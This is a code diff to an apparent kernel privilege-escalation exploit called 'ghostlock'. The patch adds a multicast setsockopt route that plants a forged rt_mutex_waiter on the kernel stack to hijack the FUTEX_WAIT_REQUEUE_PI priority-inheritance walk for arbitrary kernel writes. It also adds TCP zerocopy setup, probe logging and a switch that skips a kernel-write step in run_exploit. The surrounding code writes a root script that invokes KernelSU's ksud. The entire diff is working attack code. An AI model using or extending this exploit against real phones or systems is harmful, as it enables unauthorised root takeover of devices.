@@ -1,0 +1,574 @@
+diff --git a/src/core/common.h b/src/core/common.h
+index 82aed9e..ca7857c 100644
+--- a/src/core/common.h
++++ b/src/core/common.h
+@@ -197,12 +197,17 @@ void log_sync(void);
+ void fdset_put_word(fd_set *set, int word, uint64_t value);
+ uint64_t fdset_get_word(const fd_set *set, int word);
+ int tcp_route_selected(void);
++int mcast_route_selected(void);
++int observe_mode(void);
++int tcp_park_preinit(void);
++void tcp_park_release(void);
+ void open_selected_fds(
+     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
+ void reserve_standard_io(void);
+ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
+ void do_pselect_fake_lock_route(void);
+ void do_tcp_fake_lock_route(void);
++void do_mcast_fake_lock_route(void);
+ void reset_main_route_state(void);
+ int run_main_route_threads(void);
+ void set_pselect_write_mode(uintptr_t target, int mode);
+diff --git a/src/core/fops.c b/src/core/fops.c
+index 5d0d487..63f54d7 100644
+--- a/src/core/fops.c
++++ b/src/core/fops.c
+@@ -23,6 +23,16 @@ int route_last_errno;
+ /* compact pselect retry */
+ #define PSELECT_CFI_ROUTE_ATTEMPTS 4
+ 
++/* MCAST source-group route: setsockopt(SOL_IP, MCAST_JOIN_SOURCE_GROUP)
++ * copies the 0x108-byte group_source_req into do_ip_setsockopt's frame; the
++ * stale rt_mutex_waiter sits 0x60 bytes into that copy. */
++#define MCAST_BUF_LEN 0x108
++#define MCAST_WAITER_OFF 0x60
++#define MCAST_ROUTE_ATTEMPTS 128
++#ifndef MCAST_JOIN_SOURCE_GROUP
++#define MCAST_JOIN_SOURCE_GROUP 46
++#endif
++
+ struct tcp_punch_state {
+   int fd;
+   size_t page_size;
+@@ -34,6 +44,17 @@ static atomic_int tcp_punch_phase;
+ /* errno of the first puncher fallocate that failed; 0 while healthy */
+ static atomic_int tcp_punch_failed;
+ 
++/* Pre-created TCP/punch resources so the waiter thread can hit getsockopt
++ * immediately after FUTEX_WAIT_REQUEUE_PI returns (Direction A observe). */
++static int pre_client_fd = -1;
++static int pre_server_fd = -1;
++static int pre_punch_fd = -1;
++static char *pre_map = MAP_FAILED;
++static size_t pre_page_size;
++static pthread_t pre_puncher;
++static int pre_puncher_started;
++static struct tcp_punch_state pre_punch_state;
++
+ static void tcp_wait_for_consumer_idle(void) {
+   atomic_store(&punch_consume_go, 0);
+   while (atomic_load(&consumer_inflight)) {
+@@ -126,6 +147,69 @@ static void *tcp_punch_thread(void *arg) {
+   return NULL;
+ }
+ 
++int tcp_park_preinit(void) {
++  if (pre_client_fd >= 0) return 0;
++  if (tcp_make_pair(&pre_client_fd, &pre_server_fd) != 0) {
++    pr_error("observe preinit pair errno=%d\n", errno);
++    return -1;
++  }
++  pre_page_size = (size_t)sysconf(_SC_PAGESIZE);
++  pre_punch_fd = (int)syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC);
++  if (pre_punch_fd < 0 ||
++      fallocate(pre_punch_fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
++    pr_error("observe preinit memfd/fallocate errno=%d\n", errno);
++    return -1;
++  }
++  pre_map = mmap(NULL, TCP_PUNCH_SHMEM_LEN, PROT_READ | PROT_WRITE, MAP_SHARED,
++                 pre_punch_fd, 0);
++  if (pre_map == MAP_FAILED) {
++    pr_error("observe preinit mmap errno=%d\n", errno);
++    return -1;
++  }
++  for (size_t off = 0; off < TCP_PUNCH_SHMEM_LEN; off += pre_page_size) {
++    pre_map[off] = 0x55;
++  }
++  pre_punch_state.fd = pre_punch_fd;
++  pre_punch_state.page_size = pre_page_size;
++  atomic_store(&tcp_punch_stop, 0);
++  atomic_store(&tcp_punch_phase, 0);
++  atomic_store(&tcp_punch_failed, 0);
++  if (pthread_create(&pre_puncher, NULL, tcp_punch_thread, &pre_punch_state) !=
++      0) {
++    pr_error("observe preinit puncher errno=%d\n", errno);
++    return -1;
++  }
++  pre_puncher_started = 1;
++  pr_info("observe preinit ok client=%d server=%d map=%p page=%zu\n",
++          pre_client_fd, pre_server_fd, (void *)pre_map, pre_page_size);
++  return 0;
++}
++
++void tcp_park_release(void) {
++  atomic_store(&tcp_punch_go, 0);
++  atomic_store(&tcp_punch_stop, 1);
++  if (pre_puncher_started) {
++    pthread_join(pre_puncher, NULL);
++    pre_puncher_started = 0;
++  }
++  if (pre_map != MAP_FAILED) {
++    munmap(pre_map, TCP_PUNCH_SHMEM_LEN);
++    pre_map = MAP_FAILED;
++  }
++  if (pre_punch_fd >= 0) {
++    close(pre_punch_fd);
++    pre_punch_fd = -1;
++  }
++  if (pre_server_fd >= 0) {
++    close(pre_server_fd);
++    pre_server_fd = -1;
++  }
++  if (pre_client_fd >= 0) {
++    close(pre_client_fd);
++    pre_client_fd = -1;
++  }
++}
++
+ void do_tcp_fake_lock_route(void) {
+   if (!page_base || !fake_lock || !fake_fops) {
+     route_last_step = 40;
+@@ -142,60 +226,73 @@ void do_tcp_fake_lock_route(void) {
+   pthread_t puncher;
+   int puncher_started = 0;
+   int route_ok = 0;
+-
+-  if (tcp_make_pair(&client_fd, &server_fd) != 0) {
++  int obs = observe_mode();
++  int use_pre = (pre_client_fd >= 0 && pre_map != MAP_FAILED);
++
++  if (use_pre) {
++    client_fd = pre_client_fd;
++    server_fd = pre_server_fd;
++    punch_fd = pre_punch_fd;
++    map = pre_map;
++    puncher = pre_puncher;
++    puncher_started = pre_puncher_started;
++  } else if (tcp_make_pair(&client_fd, &server_fd) != 0) {
+     route_last_step = 41;
+     route_last_errno = errno;
+     pr_warning("tcp route pair setup failed errno=%d\n", errno);
+     return;
+   }
+ 
+-  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
+-  punch_fd = (int)syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC);
+-  if (punch_fd < 0 ||
+-      fallocate(punch_fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
+-    route_last_step = 42;
+-    route_last_errno = errno;
+-    pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
+-    goto out;
+-  }
+-  map = mmap(NULL, TCP_PUNCH_SHMEM_LEN, PROT_READ | PROT_WRITE,
+-             MAP_SHARED, punch_fd, 0);
+-  if (map == MAP_FAILED) {
+-    route_last_step = 43;
+-    route_last_errno = errno;
+-    pr_warning("tcp route mmap errno=%d\n", errno);
+-    goto out;
+-  }
+-  for (size_t off = 0; off < TCP_PUNCH_SHMEM_LEN; off += page_size) {
+-    map[off] = 0x55;
+-  }
++  size_t page_size = use_pre ? pre_page_size : (size_t)sysconf(_SC_PAGESIZE);
++  struct tcp_punch_state punch_state;
++  if (!use_pre) {
++    punch_fd = (int)syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC);
++    if (punch_fd < 0 ||
++        fallocate(punch_fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
++      route_last_step = 42;
++      route_last_errno = errno;
++      pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
++      goto out;
++    }
++    map = mmap(NULL, TCP_PUNCH_SHMEM_LEN, PROT_READ | PROT_WRITE,
++               MAP_SHARED, punch_fd, 0);
++    if (map == MAP_FAILED) {
++      route_last_step = 43;
++      route_last_errno = errno;
++      pr_warning("tcp route mmap errno=%d\n", errno);
++      goto out;
++    }
++    for (size_t off = 0; off < TCP_PUNCH_SHMEM_LEN; off += page_size) {
++      map[off] = 0x55;
++    }
+ 
+-  struct tcp_punch_state state = {.fd = punch_fd, .page_size = page_size};
+-  /* clear before the thread can start */
+-  atomic_store(&tcp_punch_stop, 0);
+-  atomic_store(&tcp_punch_phase, 0);
+-  atomic_store(&tcp_punch_failed, 0);
++    punch_state.fd = punch_fd;
++    punch_state.page_size = page_size;
++    atomic_store(&tcp_punch_stop, 0);
++    atomic_store(&tcp_punch_phase, 0);
++    atomic_store(&tcp_punch_failed, 0);
++    if (pthread_create(&puncher, NULL, tcp_punch_thread, &punch_state) != 0) {
++      route_last_step = 44;
++      route_last_errno = errno;
++      pr_warning("tcp route punch thread errno=%d\n", errno);
++      goto out;
++    }
++    puncher_started = 1;
++  }
+   atomic_store(&punch_consume_stop, 0);
+   atomic_store(&punch_consume_go, 0);
+   atomic_store(&consumer_calls, 0);
+   atomic_store(&consumer_success, 0);
+-  if (pthread_create(&puncher, NULL, tcp_punch_thread, &state) != 0) {
+-    route_last_step = 44;
+-    route_last_errno = errno;
+-    pr_warning("tcp route punch thread errno=%d\n", errno);
+-    goto out;
+-  }
+-  puncher_started = 1;
+ 
+   /* waiter->task carries init_task's phys alias, not the image address */
+   uintptr_t waiter_task = SLIDE_INIT_TASK;
+   int arm_seq = TCP_ARM_SEQ;
+   int post_hold = TCP_POST_GETSOCKOPT_HOLD;
+ 
+-  pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
+-          "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
+-          page_base, fake_lock, fake_w0, fake_task, waiter_task,
++  pr_info("tcp route enter observe=%d pre=%d page=%016zx fake_lock=%016zx "
++          "fake_w0=%016zx fake_task=%016zx task=%016zx attempts=%d arm=%d "
++          "hold=%d\n",
++          obs, use_pre, page_base, fake_lock, fake_w0, fake_task, waiter_task,
+           TCP_ROUTE_ATTEMPTS, arm_seq, post_hold);
+ 
+   atomic_store(&tcp_punch_go, 1);
+@@ -237,6 +334,23 @@ void do_tcp_fake_lock_route(void) {
+     int ret = getsockopt(client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, zc,
+                          &len);
+     int saved_errno = errno;
++    if (obs) {
++      uint64_t rb_addr = 0, rb_ctrl = 0, rb_clen = 0;
++      uint32_t rb_cblen = 0, rb_flags = 0;
++      memcpy(&rb_addr, zc + 0x00, 8);
++      memcpy(&rb_cblen, zc + 0x20, 4);
++      memcpy(&rb_flags, zc + 0x24, 4);
++      memcpy(&rb_ctrl, zc + 0x28, 8);
++      memcpy(&rb_clen, zc + 0x30, 8);
++      pr_info("obs seq=%d ret=%d errno=%d len=%u addr=%016zx cblen=%u "
++              "flags=%08x msg_control=%016zx msg_clen=%016zx task_ok=%d "
++              "lock_ok=%d\n",
++              i, ret, saved_errno, len, (size_t)rb_addr, rb_cblen, rb_flags,
++              (size_t)rb_ctrl, (size_t)rb_clen,
++              rb_ctrl == (uint64_t)waiter_task, rb_clen == (uint64_t)fake_lock);
++      if (i >= 32) break;
++      continue;
++    }
+     /* release the consumer only once the zerocopy write landed in the
+      * waiter frame; earlier release walks a half-written waiter */
+     if (i >= arm_seq && ret == 0) {
+@@ -270,30 +384,143 @@ out:
+   atomic_store(&punch_consume_stop, 1);
+   atomic_store(&tcp_punch_go, 0);
+   atomic_store(&tcp_punch_stop, 1);
+-  if (puncher_started) {
++  if (puncher_started && !use_pre) {
+     pthread_join(puncher, NULL);
+   }
+-  if (map != MAP_FAILED) {
+-    munmap(map, TCP_PUNCH_SHMEM_LEN);
+-  }
+-  if (punch_fd >= 0) {
+-    close(punch_fd);
+-  }
+-  if (server_fd >= 0) {
+-    close(server_fd);
+-  }
+-  if (client_fd >= 0) {
+-    close(client_fd);
++  if (!use_pre) {
++    if (map != MAP_FAILED) {
++      munmap(map, TCP_PUNCH_SHMEM_LEN);
++    }
++    if (punch_fd >= 0) {
++      close(punch_fd);
++    }
++    if (server_fd >= 0) {
++      close(server_fd);
++    }
++    if (client_fd >= 0) {
++      close(client_fd);
++    }
+   }
+-  if (!route_ok && route_last_step == 0) {
++  if (!route_ok && route_last_step == 0 && !obs) {
+     route_last_step = 45;
+   }
+-  pr_info("tcp route done=%d calls=%d success=%d step=%d errno=%d\n",
+-          route_ok, atomic_load(&consumer_calls),
++  pr_info("tcp route done=%d observe=%d calls=%d success=%d step=%d "
++          "errno=%d\n",
++          route_ok, obs, atomic_load(&consumer_calls),
+           atomic_load(&consumer_success), route_last_step,
+           route_last_errno);
+ }
+ 
++/* MCAST source-group route: every setsockopt copies a full waiter word
++ * shape onto the stale rt_mutex_waiter. The group_source_req copy covers
++ * waiter - 0x60 .. waiter + 0xa8, so all fields the PI walk reads are
++ * planted; the zeroed gsr_group.ss_family makes the syscall bail with
++ * -EADDRNOTAVAIL right after the copy instead of joining a group. */
++void do_mcast_fake_lock_route(void) {
++  if (!page_base || !fake_lock || !fake_fops) {
++    route_last_step = 50;
++    route_last_errno = 0;
++    pr_warning("mcast route missing page=%016zx lock=%016zx fops=%016zx\n",
++               page_base, fake_lock, fake_fops);
++    return;
++  }
++
++  int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
++  if (fd < 0) {
++    route_last_step = 51;
++    route_last_errno = errno;
++    pr_warning("mcast route socket errno=%d\n", errno);
++    return;
++  }
++
++  int obs = observe_mode();
++  int route_ok = 0;
++  int arm_seq = TCP_ARM_SEQ;
++  int post_hold = TCP_POST_GETSOCKOPT_HOLD;
++  /* the erase relink drops the waiter's tree node with {pc = value,
++   * right = 0, left = target}; the leaf arm stores 0 through pc = target-8 */
++  uint64_t relink_pc = fake_right ? fake_right : fake_parent;
++  uint64_t relink_left = fake_right ? pselect_custom_target : fake_left;
++
++  atomic_store(&punch_consume_stop, 0);
++  atomic_store(&punch_consume_go, 0);
++  atomic_store(&consumer_calls, 0);
++  atomic_store(&consumer_success, 0);
++  atomic_store(&main_route_delay_usec, 0);
++
++  pr_info("mcast route enter observe=%d page=%016zx lock=%016zx "
++          "task=%016zx pc=%016zx left=%016zx attempts=%d arm=%d hold=%d\n",
++          obs, page_base, fake_lock, fake_task, (size_t)relink_pc,
++          (size_t)relink_left, MCAST_ROUTE_ATTEMPTS, arm_seq, post_hold);
++  log_sync();
++
++  unsigned char buf[MCAST_BUF_LEN];
++  for (int i = 1; i <= MCAST_ROUTE_ATTEMPTS && !route_ok; i++) {
++    int calls_before = atomic_load(&consumer_calls);
++    int success_before = atomic_load(&consumer_success);
++
++    memset(buf, 0, sizeof(buf));
++    put64(buf, MCAST_WAITER_OFF + 0x00, relink_pc);   /* tree parent_color */
++    put64(buf, MCAST_WAITER_OFF + 0x08, 0);           /* tree rb_right */
++    put64(buf, MCAST_WAITER_OFF + 0x10, relink_left); /* tree rb_left */
++    put64(buf, MCAST_WAITER_OFF + 0x18, relink_pc);   /* pi_tree parent_color */
++    put64(buf, MCAST_WAITER_OFF + 0x20, 0);           /* pi_tree rb_right */
++    put64(buf, MCAST_WAITER_OFF + 0x28, relink_left); /* pi_tree rb_left */
++    put64(buf, MCAST_WAITER_OFF + 0x30, fake_task);   /* task */
++    put64(buf, MCAST_WAITER_OFF + 0x38, fake_lock);   /* lock */
++    put32(buf, MCAST_WAITER_OFF + 0x40, 3);           /* wake_state */
++    put32(buf, MCAST_WAITER_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
++    put64(buf, MCAST_WAITER_OFF + 0x48, 0);           /* deadline */
++    put64(buf, MCAST_WAITER_OFF + 0x50, 0);           /* ww_ctx */
++
++    errno = 0;
++    int ret = setsockopt(fd, IPPROTO_IP, MCAST_JOIN_SOURCE_GROUP, buf,
++                         sizeof(buf));
++    int saved_errno = errno;
++    if (obs) {
++      pr_info("obs seq=%d ret=%d errno=%d\n", i, ret, saved_errno);
++      if (i >= 32) break;
++      continue;
++    }
++    /* the copy lands before the family check; -EADDRNOTAVAIL means the
++     * waiter shape is on the stack now */
++    if (i >= arm_seq && (ret == 0 || saved_errno == EADDRNOTAVAIL)) {
++      atomic_store(&punch_consume_go, i);
++      for (int spin = 0; spin < post_hold; spin++) {
++        __asm__ volatile("yield" ::: "memory");
++      }
++      tcp_wait_for_consumer_idle();
++    }
++
++    int calls = atomic_load(&consumer_calls);
++    int success = atomic_load(&consumer_success);
++    if (calls <= calls_before || success <= success_before) {
++      if ((i % 16) == 0 || saved_errno != EADDRNOTAVAIL) {
++        pr_info("mcast route seq=%d ret=%d errno=%d calls=%d success=%d\n",
++                i, ret, saved_errno, calls, success);
++      }
++      continue;
++    }
++    /* consumer fired: the PI walk derefed the crafted waiter and wrote. */
++    pr_info("mcast route won seq=%d\n", i);
++    route_ok = 1;
++    route_last_step = 0;
++    route_last_errno = 0;
++  }
++
++  atomic_store(&punch_consume_go, 0);
++  atomic_store(&punch_consume_stop, 1);
++  close(fd);
++  if (!route_ok && route_last_step == 0 && !obs) {
++    route_last_step = 52;
++  }
++  pr_info("mcast route done=%d observe=%d calls=%d success=%d step=%d "
++          "errno=%d\n",
++          route_ok, obs, atomic_load(&consumer_calls),
++          atomic_load(&consumer_success), route_last_step, route_last_errno);
++  log_sync();
++}
++
+ static int route_delay_usec(int attempt) {
+   if (!(active_offsets && active_offsets->compact_waiter)) {
+     (void)attempt;
+diff --git a/src/core/main.c b/src/core/main.c
+index 243e932..385369f 100644
+--- a/src/core/main.c
++++ b/src/core/main.c
+@@ -238,8 +238,17 @@ void *waiter_thread(void *arg __attribute__((unused))) {
+   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
+   timeout.tv_sec += ROUTE_WAIT_SECONDS;
+   atomic_store(&waiter_waiting, 1);
+-  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
+-  if (tcp_route_selected()) {
++  errno = 0;
++  long fret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
++                       &f_pi_target, 0);
++  int ferr = errno;
++  if (observe_mode()) {
++    pr_info("obs futex_wait_requeue_pi ret=%ld errno=%d tid=%d\n", fret, ferr,
++            tid);
++  }
++  if (mcast_route_selected()) {
++    do_mcast_fake_lock_route();
++  } else if (tcp_route_selected()) {
+     do_tcp_fake_lock_route();
+   } else {
+     do_pselect_fake_lock_route();
+@@ -269,6 +278,8 @@ void *consumer_thread(void *arg __attribute__((unused))) {
+   pin_to_core(CONSUMER_CORE);
+   pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
+   int seen = 0;
++  const char *walk_env = getenv("GHOSTLOCK_WALK_LOG");
++  int walk_log = walk_env && *walk_env && walk_env[0] != '0';
+   while (!atomic_load(&punch_consume_stop)) {
+     int seq = atomic_load(&punch_consume_go);
+     if (seq == 0 || seq == seen) {
+@@ -287,6 +298,12 @@ void *consumer_thread(void *arg __attribute__((unused))) {
+             atomic_load(&punch_consume_go) != seq) break;
+         atomic_fetch_add(&consumer_calls, 1);
+         atomic_store(&consumer_inflight, 1);
++        /* walk logging must live on this thread: the waiter thread's
++         * stack holds the poison, any syscall there clobbers it */
++        if (walk_log) {
++          pr_info("walk seq=%d begin\n", seq);
++          log_sync();
++        }
+         errno = 0;
+         /* rotate the nice every call; (calls%19)+1 is what makes
+          * sched_setattr succeed on 6.1 compact */
+@@ -302,6 +319,10 @@ void *consumer_thread(void *arg __attribute__((unused))) {
+             sched_ret = 0;
+           }
+         }
++        if (walk_log) {
++          pr_info("walk seq=%d end ret=%ld errno=%d\n", seq, sched_ret, errno);
++          log_sync();
++        }
+         if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
+         atomic_store(&consumer_inflight, 0);
+         calls_this_seq++;
+@@ -330,6 +351,14 @@ void reset_main_route_state(void) {
+ 
+ int run_main_route_threads(void) {
+   reset_main_route_state();
++  int obs = observe_mode();
++  int use_tcp = tcp_route_selected();
++  if (use_tcp) {
++    if (obs) pr_info("observe mode: PI walk disabled\n");
++    if (tcp_park_preinit() != 0) {
++      pr_warning("tcp preinit failed; in-route setup will run\n");
++    }
++  }
+   pthread_t waiter, owner, consumer;
+   SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
+   SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
+@@ -347,6 +376,12 @@ int run_main_route_threads(void) {
+   pthread_join(waiter, NULL);
+   pthread_join(owner, NULL);
+   pthread_join(consumer, NULL);
++  if (use_tcp) {
++    tcp_park_release();
++  }
++  if (obs) {
++    return 1;
++  }
+ 
+   return atomic_load(&consumer_calls) > 0 &&
+          atomic_load(&consumer_success) > 0 && route_last_step == 0;
+@@ -536,6 +571,8 @@ static void write_root_script(void) {
+       "KSUD=\"$HOME_DIR/ksud\"\n"
+       "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
+       "chmod 644 \"$LOG\" 2>/dev/null\n"
++      "cp /sys/fs/pstore/console-ramoops* \"$HOME_DIR/\" 2>/dev/null\n"
++      "ls -l /sys/fs/pstore/ >\"$HOME_DIR/pstore_list.txt\" 2>/dev/null\n"
+       "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
+       "if [ ! -x \"$KSUD\" ]; then\n"
+       "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu.pr*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+@@ -1157,6 +1194,11 @@ int run_exploit(int argc, char **argv) {
+     }
+ 
+     int vr_ok = 1;
++    const char *skip_vr = getenv("GHOSTLOCK_SKIP_VR");
++    if (skip_vr && *skip_vr && skip_vr[0] != '0') {
++      pr_warning("VR: skipped by GHOSTLOCK_SKIP_VR\n");
++      vr_needed = 0;
++    }
+     if (vr_needed) {
+       /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
+       vr_ok &= do_one_write(child_task + TASK_THREAD_INFO_FLAGS_OFF,
+diff --git a/src/core/util.c b/src/core/util.c
+index c38b17c..094194d 100644
+--- a/src/core/util.c
++++ b/src/core/util.c
+@@ -50,7 +50,24 @@ void clear_pselect_write(void) {
+   pselect_custom_target = 0;
+ }
+ 
++/* MCAST source-group transport: setsockopt(SOL_IP, MCAST_JOIN_SOURCE_GROUP)
++ * copies the 0x108-byte group_source_req into do_ip_setsockopt's caller
++ * stack, which is deep enough to cover the stale rt_mutex_waiter the PI
++ * walk reads. Selected with GHOSTLOCK_ROUTE=mcast or GHOSTLOCK_MCAST_ROUTE=1;
++ * the page payload then uses the pselect layout and value shape. */
++int mcast_route_selected(void) {
++  const char *r = getenv("GHOSTLOCK_ROUTE");
++  if (r && *r) {
++    return strcmp(r, "mcast") == 0;
++  }
++  const char *m = getenv("GHOSTLOCK_MCAST_ROUTE");
++  return m && *m && strcmp(m, "0") != 0;
++}
++
+ int tcp_route_selected(void) {
++  if (mcast_route_selected()) {
++    return 0;
++  }
+   /* compact defaults to tcp; GHOSTLOCK_TCP_ROUTE=0 selects pselect */
+   const char *s = getenv("GHOSTLOCK_TCP_ROUTE");
+   if (s && *s && strcmp(s, "0") == 0) {
+@@ -59,6 +76,13 @@ int tcp_route_selected(void) {
+   return active_offsets && active_offsets->compact_waiter;
+ }
+ 
++/* GHOSTLOCK_OBSERVE=1: Direction-A probe. Never fire the PI walk
++ * (sched_setattr); log getsockopt/zc readback instead. */
++int observe_mode(void) {
++  const char *s = getenv("GHOSTLOCK_OBSERVE");
++  return s && *s && strcmp(s, "0") != 0;
++}
++
+ void setup_kernelsnitch(void) {
+   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+   ks = kernelsnitch_setup(
